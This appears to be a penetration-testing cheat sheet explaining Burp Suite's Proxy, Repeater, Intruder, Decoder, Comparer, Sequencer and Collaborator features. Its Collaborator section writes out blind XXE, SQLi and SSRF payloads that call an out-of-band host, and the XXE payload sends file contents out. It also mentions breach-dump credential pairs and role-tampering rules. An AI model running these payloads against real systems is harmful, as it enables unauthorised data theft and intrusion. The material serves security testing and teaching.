title: Burp Suite — Tool Mechanics (Proxy, Repeater, Intruder, Decoder, Comparer)
body: The mechanics of Burp's six core tools. Proxy is the foundation — everything flows through it. Repeater is where you prove a hypothesis: if you cannot reproduce the behaviour manually, you do not understand the bug yet. Intruder is targeted automation for variation and fuzzing, not indiscriminate brute force. Decoder saves time on encoding/decoding chains. Comparer diffs two responses byte-for-byte. Sequencer statistically analyses token randomness.
cmd:
# ══ ⭐ TOOL SELECTION — which Burp tool for what ══════════════════════
# Proxy       -> see and intercept everything (foundation — always on)
# HTTP History-> the complete log; use this over Intercept for most work
# Repeater    -> tweak one request, resend, observe — PROOF OF BUG
# Intruder    -> automate variation on ONE position (fuzz/brute)
# Comparer    -> byte-level diff of two requests or responses
# Decoder     -> encode/decode/hash any string (URL, base64, hex, HTML, gzip)
# Sequencer   -> statistical entropy test on tokens/session IDs
# Scanner     -> automated DAST (Pro only); right-click -> Scan

# ══ PROXY — the foundation ════════════════════════════════════════════
# Everything goes through port 8080 (or your configured port).
# HTTP History: Proxy -> HTTP History. Filter by:
#   Host, Status code, MIME type, Response size, Search keyword in body
# Intercept: keep OFF by default. Use for modifying specific requests.
#   ON: every request blocks until you Forward or Drop
#   OFF: traffic flows freely; you catch it in History
# Intercept responses: Proxy -> Options -> Intercept Server Responses
#   Needed for: modifying a 302 redirect to 200, editing HTML before render
# Match & Replace: Proxy -> Options -> Match and Replace
#   Automatically modify every request/response matching a pattern:
#   type=Request body, match=validated=false, replace=validated=true
#   type=Response body, match="admin":false, replace="admin":true
#   Fires on EVERY request — use for persistent parameter tamper

# ══ REPEATER — prove the hypothesis ══════════════════════════════════
# Ctrl+R from HTTP History to send any request to Repeater.
# Every Send = one request; response appears immediately.
# Multiple tabs: use for A/B comparison (original vs modified)
# Protocol: switch HTTP/1.1 <-> HTTP/2 per tab
# Follow redirects: toggle off to see the 302 Location: header naked
# Render tab: see the actual page as the browser would render it
# Key workflow:
#   1. Capture the request (HTTP History)
#   2. Send to Repeater (Ctrl+R)
#   3. Modify ONE thing at a time (parameter, header, cookie value)
#   4. Compare response: status code, body length (bottom bar), content
#   5. Repeat until you understand the bug
# Baselines: send the unmodified request first -> note size + status.
#   Even 1 byte change on a blind test = the parameter matters.

# ══ INTRUDER — targeted automation ═══════════════════════════════════
# Ctrl+I to send to Intruder. Mark positions with §value§.
# ATTACK TYPES (choose based on test):
#   Sniper      — one position, one payload list. Best for single-param fuzz.
#   Battering ram—one payload applied to ALL positions simultaneously. Fast brute.
#   Pitchfork   — multiple positions, parallel lists (list1[0]+list2[0] together).
#                 Use: username:password pairs from a breach dump.
#   Cluster bomb— multiple positions, ALL combinations (Cartesian product).
#                 Use: unknown username + unknown password. Slow/many requests.
# PAYLOAD TYPES:
#   Simple list — paste your wordlist
#   Numbers     — sequential IDs (start=1, end=9999, step=1) for IDOR enum
#   Brute forcer— charset + length (for unknown token format)
#   Runtime file— stream a large file without loading into memory
#   Null payloads—repeat N times (for race condition timing)
# PAYLOAD PROCESSING: add rules to transform each payload before sending:
#   Prefix/Suffix, URL encode, Base64, Hash (MD5/SHA1), Match/Replace
# GREP EXTRACT: pull a value from each response (CSRF token for next request)
# GREP MATCH: flag responses containing a string ("Welcome" = login success)
# RESULTS: sort by Length or Status. The odd-one-out is your finding.
# Community rate-limited (1 req/thread) -> use Turbo Intruder or ffuf for speed.

# ══ DECODER — encoding chains ═════════════════════════════════════════
# Paste any string -> Decode as: URL / HTML / Base64 / ASCII hex / Gzip / Hex
# Smart decode: auto-detects encoding format (ctrl+shift+D shortcut)
# Encode chains: decode base64 -> result is URL-encoded -> decode URL
# Hash: MD5, SHA1, SHA256, SHA512 — quick hash of any string
# Burp stores Decoder history; useful for tokens/cookies you keep coming back to.

# ══ COMPARER — byte-level diff ════════════════════════════════════════
# Right-click any request or response -> Send to Comparer
# Two items side by side -> Words (text diff) or Bytes (raw diff)
# Blue = only in item 1, Red = only in item 2, uncoloured = identical
# Primary use: diff a working vs a broken request/response to find the difference
# Also useful: diff two responses to a blind injection (true vs false condition)
# Workflow: send both to Comparer -> click Compare -> Words or Bytes

# ══ SEQUENCER — token entropy test ═══════════════════════════════════
# Tests whether session tokens / CSRF tokens are cryptographically random.
# HTTP History -> find a response that sets a session cookie -> right-click
# -> Send to Sequencer -> Start live capture
# Burp sends hundreds of requests and collects tokens; runs FIPS-140 entropy tests.
# Result: effective entropy in bits. <100 bits = weak / predictable.
# Weak token -> Intruder Brute forcer payload type to enumerate it.

# ══ MATCH & REPLACE — persistent transform rules ══════════════════════
# Proxy -> Options -> Match and Replace -> Add
# Fires on every proxied request/response:
#   Remove X-Frame-Options header (enable clickjacking test in browser)
#   Replace User-Agent with Googlebot (test for cloaking)
#   Remove HttpOnly from Set-Cookie (enable JS cookie access test)
#   Replace role=user with role=admin everywhere
#   Inject X-Forwarded-For: 127.0.0.1 into every request
# More powerful than manually editing Repeater: fires passively on all traffic.

# ══ BURP COLLABORATOR — out-of-band detection ════════════════════════
# Pro only. Provides a unique collaborator.burpcollaborator.net subdomain.
# Use in payloads for blind vulnerabilities that trigger a DNS/HTTP lookup:
#   Blind SSRF:  http://<collaborator>/
#   Blind XXE:   <!ENTITY % exfil SYSTEM "http://<collaborator>/%file;">
#   Blind SQLi:  '; exec master..xp_dirtree '\<collaborator>'--
# Collaborator tab shows DNS queries, HTTP requests, and SMTP received.
# Alternative (free): Interactsh (interact.sh) -> same concept, no Burp Pro needed.
python3 -m interactsh-client  # or use https://app.interactsh.com
warn: Repeater is where you prove the bug — if you can't reproduce it manually in Repeater, you don't understand it. Intruder Community is rate-limited to 1 thread; use Turbo Intruder (BApp) or ffuf for anything that needs speed. Match & Replace is more powerful than manual Repeater edits for testing that affects all traffic. Sequencer requires hundreds of samples to be statistically meaningful — let it run, don't stop at 50.
